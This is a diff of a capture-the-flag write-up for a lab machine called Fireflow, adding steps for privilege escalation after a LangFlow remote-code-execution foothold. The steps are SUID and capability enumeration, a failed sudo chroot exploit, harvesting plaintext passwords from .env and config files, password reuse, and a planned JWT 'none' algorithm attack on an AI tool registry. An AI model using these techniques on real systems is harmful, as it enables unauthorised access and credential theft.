@@ -286,7 +286,7 @@ We just found `index.html`, which I already expected, as the website is just a l
 In my first attempt, everything (literally everything, even `GET /skibid.aspx`) was returning http 200, so I added some filters:
 
 ```
-ffuf -u https://flow.fireflow.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -fc 404,500 -o dirs/flow.fireflow.htb/out -of all -e .html,.php,.aspx,.js,.css,.htm,.jsp -t 500 -fs 0,1142 -fw 1,132 -ac
+ffuf -u https://flow.fireflow.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -fc 404,500 -o dirs/flow.fireflow.htb/out -of all -e .html,.php,.aspx,.js,.css,.htm,.jsp -t 500 -fs 0,1142 -fw 1,132
 ```
 
 And now I could normally keep fuzzing. Unfortunately I just found a `/logs` and `/docs`, and they're both useless:
@@ -319,7 +319,7 @@ I could exploit this manually, but I found a public PoC on github: https://githu
 
 ## Understanding CVE 2026-33017 - Unauthenticated RCE in LangFlow
 
-The logic error is that anyone can create a custom component whose Python code is executed on the server, through a `build_public_tmp` request. This code can get a shell access. Here is a PoC request:
+The logic error is that anyone can create a custom component, whose python code is executed on the server, through a `build_public_tmp` request. This code can get a shell access. Here is a PoC request:
 
 ```http
 POST /api/v1/build_public_tmp/00000000-0000-0000-0000-000000000001/flow?event_delivery=direct&log_builds=false HTTP/1.1
@@ -481,5 +481,258 @@ And then ran it again:
 ```
 
 ![[Fireflow - Penelope Shell as www-data.png]]
+
+# User Privilege Escalation
+
+## langflow.db
+
+After that, I checked this langflow.db, what I want here is a sqlite3 database, so I could easily dump it's data. To check it, I just needed to run:
+
+```
+file langflow.db
+```
+
+And then get my output:
+
+```sh
+www-data@fireflow:/var/lib/langflow$ file langflow.db
+langflow.db: empty
+```
+
+This says that the langflow.db file is empty, but I'll check it with sqlite3 anyways:
+
+```sh
+www-data@fireflow:/var/lib/langflow$ which sqlite3
+/usr/bin/sqlite3
+www-data@fireflow:/var/lib/langflow$ sqlite3 langflow.db 
+SQLite version 3.45.1 2024-01-30 16:01:20
+Enter ".help" for usage hints.
+sqlite> .tables
+sqlite> .databases
+main: /var/lib/langflow/langflow.db r/o
+sqlite> 
+```
+
+## Enumerating
+
+So yes, it's actually empty, I'll keep enumerating the system, firstly I ran `getcap`, so if python or any other binary has `cap_setuid` it'll be an easy rooting:
+
+```sh
+www-data@fireflow:/var/lib/langflow$ which getcap
+/usr/sbin/getcap
+www-data@fireflow:/var/lib/langflow$ getcap -r /
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+www-data@fireflow:/var/lib/langflow$ 
+```
+
+Nothing here, let's keep enumerating. Now I targeted `sudo` (well-known for CVEs like [CVE 2025-32463](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)):
+
+```sh
+www-data@fireflow:/var/lib/langflow$ sudo -V
+Sudo version 1.9.15p5
+Sudoers policy plugin version 1.9.15p5
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.15p5
+Sudoers audit plugin version 1.9.15p5
+www-data@fireflow:/var/lib/langflow$ sudo -l
+[sudo] password for www-data: 
+sudo: a password is required
+www-data@fireflow:/var/lib/langflow$ 
+```
+
+## CVE 2025-32463
+
+The `sudo` is under a vulnerable version: `1.9.15p5` (as chwoot targets 1.9.14 up to 1.9.17, including every _p_ revision). I downloaded the public exploit to my `/tmp` directory and then uploaded it using penelope:
+
+![[Fireflow - Uploaded sudo-chwoot.png]]
+
+And then I tried running the exploit:
+
+```sh
+www-data@fireflow:/tmp$ chmod +x sudo-chwoot.sh 
+www-data@fireflow:/tmp$ ls -lAh
+total 60K
+drwxr-xr-x 1 root     root     4.0K Aug 20 01:17 ctd-volume338964395
+drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .font-unix
+drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .ICE-unix
+drwx------ 2 root     root     4.0K Aug 20 01:15 snap-private-tmp
+-rwxr-xr-x 1 www-data www-data 1.1K Aug 20 02:00 sudo-chwoot.sh
+drwx------ 3 root     root     4.0K Aug 20 01:37 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-fwupd.service-dPhxij
+drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-ModemManager.service-Piw5ZD
+drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-polkit.service-WFC0f9
+drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-logind.service-tAVqS7
+drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-resolved.service-pLBMsO
+drwx------ 3 root     root     4.0K Aug 20 01:15 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-systemd-timesyncd.service-z4x3zw
+drwx------ 3 root     root     4.0K Aug 20 01:37 systemd-private-aae608ce521d4d2092c9cb4d44e609f7-upower.service-aH0xhs
+drwx------ 2 root     root     4.0K Aug 20 01:16 vmware-root_679-3988687326
+drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .X11-unix
+drwxrwxrwt 2 root     root     4.0K Aug 20 01:15 .XIM-unix
+www-data@fireflow:/tmp$ ./sudo-chwoot.sh 
+woot!
+[sudo] password for www-data: 
+Sorry, try again.
+[sudo] password for www-data: 
+Sorry, try again.
+[sudo] password for www-data: 
+sudo: 3 incorrect password attempts
+www-data@fireflow:/tmp$ 
+```
+
+Unfortunately, the machine `www-data` user has a password (which isn't expected), so this won't work.
+
+## More enumeration
+
+Now I attempted to find the "common" stuff: SUID Binaries. I just needed to run `find` command with some parameters:
+
+```sh
+www-data@fireflow:/tmp$ find / -type f -perm -4000 2>/dev/null 
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/fusermount3
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+www-data@fireflow:/tmp$ 
+```
+
+Nothing again, I'll check now for `.env` files, using `find` again:
+
+```sh
+www-data@fireflow:/tmp$ find / -type f -name .env 2>/dev/null
+/etc/langflow/.env
+www-data@fireflow:/tmp$ cat /etc/langflow/.env
+LANGFLOW_AUTO_LOGIN=False
+LANGFLOW_SUPERUSER=langflow
+LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
+LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
+LANGFLOW_CONFIG_DIR=/var/lib/langflow
+LANGFLOW_LOG_LEVEL=warning
+LANGFLOW_NEW_USER_IS_ACTIVE=False
+LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
+www-data@fireflow:/tmp$ 
+```
+
+## Password Reuse: Shell as nightfall
+
+We got it, I need to check for users in `/home` and with shell in `/etc/passwd`, to abuse a possible CWE 260 for ssh (which is Password in Configuration File).
+
+```
+www-data@fireflow:/tmp$ ls /home
+nightfall
+www-data@fireflow:/tmp$ cat /etc/passwd | grep sh
+root:x:0:0:root:/root:/bin/bash
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+nightfall:x:1000:1000::/home/nightfall:/bin/bash
+www-data@fireflow:/tmp$ 
+```
+
+So we already know the `nighfall` user, let's try the password `n1ghtm4r3_b4_n1ghtf4ll` for logging in:
+
+```sh
+www-data@fireflow:/tmp$ su nightfall
+Password: 
+nightfall@fireflow:/tmp$ id
+uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
+nightfall@fireflow:/tmp$ 
+```
+
+It works! Now I'll just try using it with ssh (the port 22 was open too):
+
+![[Fireflow - Connecting as nightfall through ssh.png]]
+
+And it works too! Now let's keep escalating our privileges to root!
+
+# Local Privilege Escalation to Root
+
+First of all I'll search for any configuration file in my home directory and for any creds in the environment:
+
+```sh
+nightfall@fireflow:~$ ls -lAh
+total 28K
+lrwxrwxrwx 1 root      root         9 May 12 14:24 .bash_history -> /dev/null
+-rw-r--r-- 1 nightfall nightfall  220 Mar 31  2024 .bash_logout
+-rw-r--r-- 1 nightfall nightfall 3.7K Mar 31  2024 .bashrc
+drwx------ 2 nightfall nightfall 4.0K May 12 15:28 .cache
+drwxrwxr-x 3 nightfall nightfall 4.0K May 12 15:28 .local
+drwx------ 2 nightfall nightfall 4.0K Aug 20 01:15 .mcp
+-rw-r--r-- 1 nightfall nightfall  807 Mar 31  2024 .profile
+-rw-r----- 1 root      nightfall   33 Aug 20 01:16 user.txt
+nightfall@fireflow:~$ ls .mcp/
+config.json
+nightfall@fireflow:~$ cat .mcp/config.json 
+{
+  "server": "http://10.129.89.39:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "langflow-bot",
+  "password": "Langfl0w@mcp2026!"
+}
+nightfall@fireflow:~$ env
+SHELL=/usr/bin/bash
+HISTCONTROL=ignoreboth
+PWD=/home/nightfall
+LOGNAME=nightfall
+XDG_SESSION_TYPE=tty
+HOME=/home/nightfall
+LANG=en_US.UTF-8
+HISTFILE=/dev/null
+LS_COLORS=<this env is a bit large, but haven't nothing interesting>
+SSH_CONNECTION=10.10.15.160 39650 10.129.89.39 22
+LESSCLOSE=/usr/bin/lesspipe %s %s
+XDG_SESSION_CLASS=user
+TERM=xterm-256color
+LESSOPEN=| /usr/bin/lesspipe %s
+USER=nightfall
+SHLVL=3
+XDG_SESSION_ID=13
+XDG_RUNTIME_DIR=/run/user/1000
+SSH_CLIENT=10.10.15.160 39650 22
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+_=/usr/bin/env
+nightfall@fireflow:~$ 
+```
+
+## Enumerating the MCP AI Tool Registry
+
+I just got a login and password to another web app, let's reach it with curl:
+
+```sh
+nightfall@fireflow:~$ curl -s http://10.129.89.39:30080/api/v1/version | jq
+{
+  "service": "MCP AI Tool Registry",
+  "version": "0.1.0",
+  "auth": {
+    "type": "JWT",
+    "header": "Authorization: Bearer <token>",
+    "supported_algorithms": [
+      "HS256",
+      "none"
+    ]
+  },
+  "docs": "/docs",
+  "endpoints": [
+    "POST /mcp                        [MCP JSON-RPC 2.0]",
+    "POST /api/v1/auth",
+    "GET  /api/v1/tools",
+    "POST /api/v1/tools               [admin]"
+  ]
+}
+nightfall@fireflow:~$ 
+```
+
+One interesting thing, we can use `none` as our algorithm, this is a attack vector to escalate our privileges, just editing our JWT and signing it with _none algorithm_.
+
+
 
 ---
